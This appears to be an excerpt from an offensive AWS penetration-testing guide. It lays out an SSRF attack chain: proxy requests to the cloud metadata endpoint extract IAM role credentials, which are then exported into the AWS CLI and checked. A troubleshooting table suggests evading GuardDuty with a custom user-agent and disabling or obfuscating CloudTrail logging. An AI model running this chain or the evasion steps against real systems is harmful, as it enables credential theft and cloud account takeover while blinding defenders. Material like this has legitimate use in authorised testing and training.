# Example 1: SSRF to Admin

```bash
# 1. Find SSRF vulnerability in web app
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. Get role name from response
# 3. Extract credentials
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole

# 4. Configure AWS CLI with stolen creds
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 5. Verify access
aws sts get-caller-identity
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Access Denied on all commands | Enumerate permissions with enumerate-iam |
| Metadata endpoint blocked | Check for IMDSv2, try container metadata |
| GuardDuty alerts | Use Pacu with custom user-agent |
| Expired credentials | Re-fetch from metadata (temp creds rotate) |
| CloudTrail logging actions | Consider disable or log obfuscation |

---

## Additional Resources

For advanced techniques including Lambda/API Gateway exploitation, Secrets Manager & KMS, Container security (ECS/EKS/ECR), RDS/DynamoDB exploitation, VPC lateral movement, and security checklists, see [references/advanced-aws-pentesting.md](references/advanced-aws-pentesting.md).